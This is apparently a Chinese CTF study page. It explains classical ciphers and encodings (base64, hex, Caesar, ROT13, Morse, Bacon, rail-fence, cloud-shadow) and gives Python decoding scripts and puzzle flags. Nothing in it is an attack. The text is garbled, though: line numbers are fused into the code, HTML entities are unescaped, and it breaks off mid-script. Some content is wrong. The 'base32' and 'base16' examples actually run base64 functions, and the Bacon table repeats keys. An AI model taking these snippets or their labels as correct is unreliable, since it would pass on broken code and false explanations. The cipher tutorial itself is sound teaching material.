相比于base64只是去掉了两个在网络上不便传输的符号 特征特点：密文由62字符（0-9，a-z，A-Z）组成 18nCDq36gzGn8hf4M2HJUsn4aYcYRBSJwj4aE0hbgpzHb4aHcH1zzC9C3IL base91特征特点：密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~”）组成 12345678910111213141516import base64print(&quot;base64:&quot;)encode64 = base64.b64encode(b&#x27;I love you&#x27;)decode64 = base64.b64decode(b&#x27;SSBsb3ZlIHlvdQ==&#x27;)print(encode64)print(decode64)print(&quot;base32:&quot;)encode32 = base64.b64encode(b&#x27;I love you&#x27;)decode32 = base64.b64decode(b&#x27;SSBsb3ZlIHlvdQ==&#x27;)print(encode32)print(decode32)print(&quot;base16:&quot;)encode16 = base64.b64encode(b&#x27;I love you&#x27;)decode16 = base64.b64decode(b&#x27;SSBsb3ZlIHlvdQ==&#x27;)print(encode16)print(decode16) 123456789base64:b&#x27;SSBsb3ZlIHlvdQ==&#x27;b&#x27;I love you&#x27;base32:b&#x27;SSBsb3ZlIHlvdQ==&#x27;b&#x27;I love you&#x27;base16:b&#x27;SSBsb3ZlIHlvdQ==&#x27;b&#x27;I love you&#x27; 字符串逆序12steady_str&#x3D;&quot;galf&#123;Lsklth_jxih_guxz_jsgtexp&#125;&quot;print(steady_str[::-1]) 进制转化两个一组转化为十六进制然后在转化为ascii 1234567str1=&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&#x27;flag=&quot;&quot;while len(str1): print(len(str1)) flag+=chr(int(str1[:2],16)%128) str1=str1[2:]print(flag) 字符串分割 123456str1=&quot;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;&quot;flag=&quot;&quot;print(str1[0])for i in range(3,len(str1),5): flag+=str1[i]print(flag) 混合进制解密 123456789101112131415161718text = &#x27;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&#x27;s=text.split()print(s)flag=&quot;&quot;for i in s: if i[0]==&#x27;d&#x27;: i=chr(int(i[1:])) flag+=i elif i[0]==&#x27;x&#x27;: i=chr(int((&#x27;0&#x27;+i),16)) flag+=i elif i[0]==&#x27;b&#x27;: i=chr(int((&#x27;0&#x27;+i),2)) flag+=i elif i[0]==&#x27;o&#x27;: i=chr(int((&#x27;0&#x27;+i),8)) flag+=iprint(flag) 十六进制准换ascii 1234567steady_str=&quot;57656C6C20646F6E653A4A35584759364A414E3558474B4944544F525358414944424F355158534F5352474934584B5752544A4A5547495343574F4E4D56515554514D495A444B3653504E55345755594C4F494933574B334C554F425257323442544D4A4C5451354443474A344847594C4A4746325745563359474E47464F3444574D56445757354445493459584D5953484756345745334A5A47425347324D4C324D5A49543250493D&quot;steady_flag=&quot;&quot;for i in range(0,len(steady_str),2): h=&quot;0x&quot;+steady_str[i:i+2] n=int(h,16) steady_flag+=chr(n)print(steady_flag) 凯撒密码原理凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。现今又叫“移位密码”，只不过移动的位数不一定是3位而已。 下面我们总结一下： 明密对照表： 明文：ABCDEFGHIJKLMNOPQRSTUVWXYZ 密文：TUVWXYZABCDEFGHIJKLMNOPQRS 注：广义上的凯撒是位移的。 凯撒是没有密匙的，即使没有密匙也能将它破解出来，因为凯撒移位密码只有25种密匙。 暴力破解 123456789101112131415161718192021222324str1 = &quot;oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;&quot;num = 26def steady(str=&quot;123&quot;,num=1): l = list(str) i = 0 while i &lt; len(l): if l[i]&gt;=&#x27;0&#x27; and l[i]&lt;=&#x27;9&#x27;: i = i+1 elif l[i]&gt;=&#x27;a&#x27; and l[i] &lt;=&#x27;z&#x27;: l[i]=chr(ord(&#x27;a&#x27;)+(ord(l[i])+num-ord(&#x27;a&#x27;))%26) i =i+1 elif l[i]&gt;=&#x27;A&#x27; and l[i] &lt;=&#x27;Z&#x27;: l[i]=chr(ord(&#x27;A&#x27;)+(ord(l[i])+num-ord(&#x27;A&#x27;))%26) i=i+1 else: i =i+1 ans = &quot;&quot;.join(l) return ansfor i in range(num): steady_str = steady(str1,i) print(steady_str) 每一位的移位数量不一样 12345678steady_str=&quot;afZ_r9VYfScOeO_UL^RWUc&quot;start=5flag=&quot;&quot;for i in range(len(steady_str)): print(steady_str[i]) flag+=chr(ord(steady_str[i])+start) start+=1print(flag) Task:I guess you are done with Caesar, aren’t you?The big problem with caesar is that it does not allow digits or other characters.I have fixed this, and now I can use any ascii character in the plaintext.The keyspace has increased from 26 to 128 too. \\o/ 123456789101112data2&#x3D;&quot;372332333823253030333b23282d2b2d38372333362333382c293623272c25362527382936370d232c253a29232a2d3c292823382c2d37232532282332333b230d23272532233937292325323d232537272d2d23272c25362527382936232d3223382c29233430252d3238293c382a30252b1e0e14073f3d33392336233b2d3241&quot;for i in range(128): flag&#x3D;&quot;&quot; for j in range(0,len(data2),2): string&#x3D;&quot;0x&quot; + data2[j:j+2] inting&#x3D;int(string,16)+i if inting &gt; 128: flag+&#x3D;chr(inting%128) else: flag+&#x3D;chr(inting) if &quot;ZJPC&quot; in flag: print(flag) 莫斯密码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556dict1 = &#123;&#x27;0&#x27;: &#x27;.&#x27;, &#x27;1&#x27;: &#x27;-&#x27;, &#x27; &#x27;: &#x27;/&#x27; &#125;;dict2 = &#123;&#x27;.-&#x27;: &#x27;a&#x27;, &#x27;-...&#x27;: &#x27;b&#x27;, &#x27;-.-.&#x27;: &#x27;c&#x27;, &#x27;-..&#x27;:&#x27;d&#x27;, &#x27;.&#x27;:&#x27;e&#x27;, &#x27;..-.&#x27;:&#x27;f&#x27;, &#x27;--.&#x27;: &#x27;g&#x27;, &#x27;....&#x27;: &#x27;h&#x27;, &#x27;..&#x27;: &#x27;i&#x27;, &#x27;.---&#x27;:&#x27;j&#x27;, &#x27;-.-&#x27;: &#x27;k&#x27;, &#x27;.-..&#x27;: &#x27;l&#x27;, &#x27;--&#x27;: &#x27;m&#x27;, &#x27;-.&#x27;: &#x27;n&#x27;, &#x27;---&#x27;: &#x27;o&#x27;, &#x27;.--.&#x27;: &#x27;p&#x27;, &#x27;--.-&#x27;: &#x27;q&#x27;, &#x27;.-.&#x27;: &#x27;r&#x27;, &#x27;...&#x27;: &#x27;s&#x27;, &#x27;-&#x27;: &#x27;t&#x27;, &#x27;..-&#x27;: &#x27;u&#x27;, &#x27;...-&#x27;: &#x27;v&#x27;, &#x27;.--&#x27;: &#x27;w&#x27;, &#x27;-..-&#x27;: &#x27;x&#x27;, &#x27;-.--&#x27;: &#x27;y&#x27;, &#x27;--..&#x27;: &#x27;z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;/&#x27;: &#x27; &#x27; &#125;;steady_str1=&quot;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&quot;steady_str2=&quot;&quot;steady_str4=&quot;&quot;for i in steady_str1: steady_str2+=dict1[i]print(&quot;莫斯电码为：&quot;+steady_str2)for j in steady_str2: steady_str3=steady_str2.split(&#x27;/&#x27;)print(&quot;分割莫斯电码：&quot;)print(steady_str3)for z in steady_str3: steady_str4+=dict2[z]print(&quot;flag：&quot;+steady_str4) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758dict1 = &#123;&#x27;0&#x27;: &#x27;.&#x27;, &#x27;1&#x27;: &#x27;-&#x27;, &#x27; &#x27;: &#x27;/&#x27; &#125;;dict2 = &#123;&#x27;.-&#x27;: &#x27;a&#x27;, &#x27;-...&#x27;: &#x27;b&#x27;, &#x27;-.-.&#x27;: &#x27;c&#x27;, &#x27;-..&#x27;:&#x27;d&#x27;, &#x27;.&#x27;:&#x27;e&#x27;, &#x27;..-.&#x27;:&#x27;f&#x27;, &#x27;--.&#x27;: &#x27;g&#x27;, &#x27;....&#x27;: &#x27;h&#x27;, &#x27;..&#x27;: &#x27;i&#x27;, &#x27;.---&#x27;:&#x27;j&#x27;, &#x27;-.-&#x27;: &#x27;k&#x27;, &#x27;.-..&#x27;: &#x27;l&#x27;, &#x27;--&#x27;: &#x27;m&#x27;, &#x27;-.&#x27;: &#x27;n&#x27;, &#x27;---&#x27;: &#x27;o&#x27;, &#x27;.--.&#x27;: &#x27;p&#x27;, &#x27;--.-&#x27;: &#x27;q&#x27;, &#x27;.-.&#x27;: &#x27;r&#x27;, &#x27;...&#x27;: &#x27;s&#x27;, &#x27;-&#x27;: &#x27;t&#x27;, &#x27;..-&#x27;: &#x27;u&#x27;, &#x27;...-&#x27;: &#x27;v&#x27;, &#x27;.--&#x27;: &#x27;w&#x27;, &#x27;-..-&#x27;: &#x27;x&#x27;, &#x27;-.--&#x27;: &#x27;y&#x27;, &#x27;--..&#x27;: &#x27;z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;/&#x27;: &#x27; &#x27; &#125;;steady_str=&quot;o00。o。o0oo。0o0o。000。00。o。0。000。ooo0。o。0o。oo0。ooo。0o0o。0。oo0o&quot;flag=&quot;&quot;for i in steady_str: if i==&#x27;o&#x27;: flag+=i.replace(&#x27;o&#x27;,&#x27;.&#x27;) elif i==&#x27;0&#x27;: flag+=i.replace(&#x27;0&#x27;,&#x27;-&#x27;) elif i==&#x27;。&#x27;: flag+=i.replace(&#x27;。&#x27;,&#x27; &#x27;)new_flag=&quot;&quot;flag=flag.split(&quot; &quot;)for i in flag: print(i) new_flag+=dict2[i]print(new_flag) ASCII编码1&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119; 12345678910111213steady_str=&quot;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;&quot;steady_str1=steady_str.split(&#x27;;&#x27;)steady_str3=[]steady_flag=&quot;&quot;for i in steady_str1: try: steady_str2=i.split(&#x27;&amp;#&#x27;)[1] except: pass steady_str3.append(steady_str2)for i in steady_str3: steady_flag+=chr(int(i))print(steady_flag) 栏栅密码栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文。 12345678910111213141516171819def fence(lst, numrails): fence = [[None] * len(lst) for n in range(numrails)] rails = range(numrails - 1) + range(numrails - 1, 0, -1) for n, x in enumerate(lst): fence[rails[n % len(rails)]][n] = x return [c for rail in fence for c in rail if c is not None]def encode(text, n): return &#x27;&#x27;.join(fence(text, n))def decode(text, n): rng = range(len(text)) pos = fence(rng, n) return &#x27;&#x27;.join(text[pos.index(n)] for n in rng)z = &quot;ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g&quot;for i in range(2,10): y = decode(z,i) print y 培根密码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495import sysdef peig1(m): basic1 = &#123; &#x27;AAAAA&#x27; : &#x27;A&#x27;, &#x27;AAAAB&#x27; : &#x27;B&#x27;, &#x27;AAABA&#x27; : &#x27;C&#x27;, &#x27;AAABB&#x27; : &#x27;D&#x27;, &#x27;AABAA&#x27; : &#x27;E&#x27;, &#x27;AABAB&#x27; : &#x27;F&#x27;, &#x27;AABBA&#x27; : &#x27;G&#x27;, &#x27;AABBB&#x27; : &#x27;H&#x27;, &#x27;ABAAA&#x27; : &#x27;I&#x27;, &#x27;ABAAB&#x27; : &#x27;J&#x27;, &#x27;ABABA&#x27; : &#x27;K&#x27;, &#x27;ABABB&#x27; : &#x27;L&#x27;, &#x27;ABBAB&#x27; : &#x27;N&#x27;, &#x27;ABBBA&#x27; : &#x27;O&#x27;, &#x27;ABBBB&#x27; : &#x27;P&#x27;, &#x27;BAAAA&#x27; : &#x27;Q&#x27;, &#x27;BAAAB&#x27; : &#x27;R&#x27;, &#x27;BAABA&#x27; : &#x27;S&#x27;, &#x27;BAABB&#x27; : &#x27;T&#x27;, &#x27;BABAA&#x27; : &#x27;U&#x27;, &#x27;BABAB&#x27; : &#x27;V&#x27;, &#x27;BABBA&#x27; : &#x27;W&#x27;, &#x27;BABBB&#x27; : &#x27;X&#x27;, &#x27;BBAAA&#x27; : &#x27;Y&#x27;, &#x27;BBAAB&#x27; : &#x27;Z&#x27; &#125; output = &#x27;&#x27; for i in range(0, len(m) - 4, 5): temp = m[i: i + 5] output += basic1[temp] return outputdef peig2(m): basic2 = &#123; &#x27;AAAAA&#x27; : &#x27;A&#x27;, &#x27;AAAAB&#x27; : &#x27;B&#x27;, &#x27;AAABA&#x27; : &#x27;C&#x27;, &#x27;AAABB&#x27; : &#x27;D&#x27;, &#x27;AABAA&#x27; : &#x27;E&#x27;, &#x27;AABAB&#x27; : &#x27;F&#x27;, &#x27;AABBA&#x27; : &#x27;G&#x27;, &#x27;AABBB&#x27; : &#x27;H&#x27;, &#x27;ABAAA&#x27; : &#x27;I&#x27;, &#x27;ABAAA&#x27; : &#x27;J&#x27;, &#x27;ABAAB&#x27; : &#x27;K&#x27;, &#x27;ABABA&#x27; : &#x27;L&#x27;, &#x27;ABABB&#x27; : &#x27;M&#x27;, &#x27;ABBAA&#x27; : &#x27;N&#x27;, &#x27;ABBAB&#x27; : &#x27;O&#x27;, &#x27;ABBBA&#x27; : &#x27;P&#x27;, &#x27;ABBBB&#x27; : &#x27;Q&#x27;, &#x27;BAAAA&#x27; : &#x27;R&#x27;, &#x27;BAAAB&#x27; : &#x27;S&#x27;, &#x27;BAABA&#x27; : &#x27;T&#x27;, &#x27;BAABB&#x27; : &#x27;U&#x27;, &#x27;BAABB&#x27; : &#x27;V&#x27;, &#x27;BABAA&#x27; : &#x27;W&#x27;, &#x27;BABAB&#x27; : &#x27;X&#x27;, &#x27;BABBA&#x27; : &#x27;Y&#x27;, &#x27;BABBB&#x27; : &#x27;Z&#x27; &#125; output = &#x27;&#x27; for i in range(0, len(m) - 4, 5): temp = m[i: i + 5] output += basic2[temp] return outputif __name__ == &quot;__main__&quot;: m = &quot;aaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba&quot; mode = 2 if len(m)%5 == 0: l = [] k = [] for i in xrange(len(m)/5): l.append(m[:5]) m = m[5:] if mode == 1: for i in l: if i.isupper(): k.append(peig1(i)) else: i = i.upper() k.append(peig1(i)) elif mode == 2: for i in l: if i.isupper(): k.append(peig2(i)) else: i = i.upper() k.append(peig2(i)) flag = &#x27;&#x27; for i in k: flag+=i[0] print(flag) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485dict1 = &#123;&#x27;aaaaa&#x27;:&#x27;a&#x27;, &#x27;aaaab&#x27;:&#x27;b&#x27;, &#x27;aaaba&#x27;:&#x27;c&#x27;, &#x27;aaabb&#x27;:&#x27;d&#x27;, &#x27;aabaa&#x27;:&#x27;e&#x27;, &#x27;aabab&#x27;:&#x27;f&#x27;, &#x27;aabba&#x27;:&#x27;g&#x27;, &#x27;aabbb&#x27;:&#x27;h&#x27;, &#x27;abaaa&#x27;:&#x27;i&#x27;, &#x27;abaab&#x27;:&#x27;j&#x27;, &#x27;ababa&#x27;:&#x27;k&#x27;, &#x27;ababb&#x27;:&#x27;l&#x27;, &#x27;abbaa&#x27;:&#x27;m&#x27;, &#x27;abbab&#x27;:&#x27;n&#x27;, &#x27;abbba&#x27;:&#x27;o&#x27;, &#x27;abbbb&#x27;:&#x27;p&#x27;, &#x27;baaaa&#x27;:&#x27;q&#x27;, &#x27;baaab&#x27;:&#x27;r&#x27;, &#x27;baaba&#x27;:&#x27;s&#x27;, &#x27;baabb&#x27;:&#x27;t&#x27;, &#x27;babaa&#x27;:&#x27;u&#x27;, &#x27;babab&#x27;:&#x27;v&#x27;, &#x27;babba&#x27;:&#x27;w&#x27;, &#x27;babbb&#x27;:&#x27;x&#x27;, &#x27;bbaaa&#x27;:&#x27;y&#x27;, &#x27;bbaab&#x27;:&#x27;z&#x27; &#125;;dict2 = &#123;&#x27;.-&#x27;: &#x27;a&#x27;, &#x27;-...&#x27;: &#x27;b&#x27;, &#x27;-.-.&#x27;: &#x27;c&#x27;, &#x27;-..&#x27;:&#x27;d&#x27;, &#x27;.&#x27;:&#x27;e&#x27;, &#x27;..-.&#x27;:&#x27;f&#x27;, &#x27;--.&#x27;: &#x27;g&#x27;, &#x27;....&#x27;: &#x27;h&#x27;, &#x27;..&#x27;: &#x27;i&#x27;, &#x27;.---&#x27;:&#x27;j&#x27;, &#x27;-.-&#x27;: &#x27;k&#x27;, &#x27;.-..&#x27;: &#x27;l&#x27;, &#x27;--&#x27;: &#x27;m&#x27;, &#x27;-.&#x27;: &#x27;n&#x27;, &#x27;---&#x27;: &#x27;o&#x27;, &#x27;.--.&#x27;: &#x27;p&#x27;, &#x27;--.-&#x27;: &#x27;q&#x27;, &#x27;.-.&#x27;: &#x27;r&#x27;, &#x27;...&#x27;: &#x27;s&#x27;, &#x27;-&#x27;: &#x27;t&#x27;, &#x27;..-&#x27;: &#x27;u&#x27;, &#x27;...-&#x27;: &#x27;v&#x27;, &#x27;.--&#x27;: &#x27;w&#x27;, &#x27;-..-&#x27;: &#x27;x&#x27;, &#x27;-.--&#x27;: &#x27;y&#x27;, &#x27;--..&#x27;: &#x27;z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;/&#x27;: &#x27; &#x27; &#125;;enc_str0=&quot;--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-&quot;dec_str=&quot;&quot;enc_str2=&quot;&quot;enc_str1=enc_str0.split(&quot;/&quot;)for i in enc_str1: try: enc_str2 += dict2[i] except: passprint(enc_str2)enc_str2=enc_str2.split(&quot;hhhh&quot;)[1]for i in range(len(enc_str2)/5): dec_str += dict1[enc_str2[:5]] enc_str2=enc_str2[5:]print(dec_str) 云影密码加密方式仅使用01248这5种数字来进行，其中0用来唯一表示间隔，其他数字用加法和表示替换密文。再使用数字126表示字母AZ。 12345678910111213steady_dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;steady_str=&quot;8842101220480224404014224202480122&quot;steady_str=steady_str.split(&quot;0&quot;)steady_flag=&quot;&quot;for i in steady_str: steady_sum=0 for j in i: steady_sum+=int(j) if steady_sum &gt; 26: steady_sum=steady_sum%26 print(steady_sum-1) steady_flag+=steady_dic[steady_sum-1]print(steady_flag) Rot131234567891011121314151617181920212223steady_dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;steady_dic1=&quot;abcdefghijklmnopqrstuvwxyz&quot;print(steady_dic1)steady_str=&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;steady_flag=&quot;&quot;steady_num=13num=0for i in steady_str: if ord(&#x27;a&#x27;) &lt;= ord(i) and ord(i) &lt;= ord(&#x27;z&#x27;): num=steady_dic1.index(i)+1+steady_num if num &gt; 26: num=num%26 print(num) steady_flag+=steady_dic1[num-1] elif ord(&#x27;A&#x27;) &lt;= ord(i) and ord(i) &lt;= ord(&#x27;Z&#x27;): num=steady_dic.index(i)+1+steady_num if num &gt; 26: num=num%26 print(num) steady_flag+=steady_dic[num-1] else: steady_flag+=iprint(steady_flag) unicode编码1&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119; 轮转机加密123456789101112131415161718192021import resteady_str=&#x27;&#x27;&#x27;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; 